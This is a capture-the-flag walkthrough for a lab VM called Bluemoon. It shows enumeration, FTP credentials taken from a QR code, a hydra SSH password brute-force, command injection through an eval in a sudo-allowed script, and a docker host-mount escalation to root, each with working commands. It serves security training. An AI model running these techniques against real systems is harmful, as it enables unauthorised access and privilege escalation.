# Bluemoon – Complete Walkthrough

## 1. Discovery

Use `arp-scan` to find live hosts on the local network.

```bash
sudo arp-scan -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:c7:7f:a3, IPv4: 192.168.56.102
192.168.56.1   0a:00:27:00:00:09   (Unknown)
192.168.56.100 08:00:27:97:2c:f6   (Unknown)
192.168.56.101 08:00:27:06:68:29   (Unknown)

The target is 192.168.56.101 (Bluemoon VM).
2. Port Scanning

Run an nmap scan to identify open ports and services.
bash

nmap -sC -sV -p- 192.168.56.101

Results:
text

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38

3. Web Enumeration

Visit http://192.168.56.101 in a browser.

    Welcome Page
    Are You Ready To Play With Me ...!

Use gobuster to brute-force directories:
bash

gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt

Found: /hidden_text
4. Hidden Text

Navigate to http://192.168.56.101/hidden_text.

Page shows:

    Maintenance!
    Sorry For Delay. We Will Recover Soon. Thank You ...

Click the Thank You button → redirected to a QR code page:
http://192.168.56.101/QR_COd3.png
5. Decode the QR Code

Download the QR image and decode it using zbarimg:
bash

wget http://192.168.56.101/QR_COd3.png
zbarimg QR_COd3.png

Decoded output:
text

ftp://userftp:ftpp@ssword@192.168.56.117

Thus, FTP credentials are:

    Username: userftp

    Password: ftpp@ssword

    FTP Server: 192.168.56.117

    Note: The FTP server IP may differ from the web server. In this lab, it was 192.168.56.117.

6. FTP Enumeration

Connect to the FTP server:
bash

ftp 192.168.56.117

Login with userftp / ftpp@ssword.

List files:
text

ftp> ls -la
-rw-r--r--    1 ftp      ftp           220 Apr  3  2021 information.txt
-rw-r--r--    1 ftp      ftp           124 Apr  3  2021 p_list.txt

Download both files:
bash

get information.txt
get p_list.txt
quit

Contents of information.txt:
text

The system administrator is robin.
He uses a weak password from the common password list.

Contents of p_list.txt (sample):
text

password123
letmein
admin
robin123
qwerty
trustno1

7. SSH Brute-Force

We have a username (robin) and a password list. Use hydra to brute-force SSH.
bash

hydra -l robin -P p_list.txt ssh://192.168.56.101

Successful login:
text

[22][ssh] host: 192.168.56.101   login: robin   password: robin123

8. SSH Access as Robin
bash

ssh robin@192.168.56.101
password: robin123

First Flag:
bash

ls -la
cat user1.txt

Flag 1: FLAG{1_w4s_h1dd3n_1n_pl41n_s1ght}
9. Exploring the project Directory
bash

cd project
ls -la

Found feedback.sh:
bash

#!/bin/bash
echo "Enter your feedback:"
read feedback
echo "Thanks: $feedback" > /tmp/feedback.log
eval $feedback

This script is dangerous because it evaluates whatever the user inputs.

Check sudo permissions for robin:
bash

sudo -l

Output:
text

User robin may run the following commands on BlueMoon:
    (jerry) NOPASSWD: /home/robin/project/feedback.sh

So robin can run feedback.sh as user jerry without a password.
10. Privilege Escalation to Jerry

Exploit the eval by injecting a reverse shell or spawning a PTY.
bash

sudo -u jerry /home/robin/project/feedback.sh

When prompted for feedback, enter:
bash

python -c 'import pty; pty.spawn("/bin/bash")'

After the command executes, you get a shell as jerry.
bash

whoami
# jerry

Second Flag:
bash

cd /home/jerry
cat user2.txt

Flag 2: FLAG{3sc4l4t10n_t0_j3rry_d0n3}
11. Final Privilege Escalation (Root via Docker)

Check if jerry can run Docker commands:
bash

groups jerry
# jerry docker

jerry is in the docker group → can run containers with host mounts.

Run an Alpine container with the host root mounted:
bash

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Now you are root inside the host.

Final Flag:
bash

cat /root/root.txt

Flag 3: FLAG{d0ck3r_3sc4l4t10n_t0_r00t}
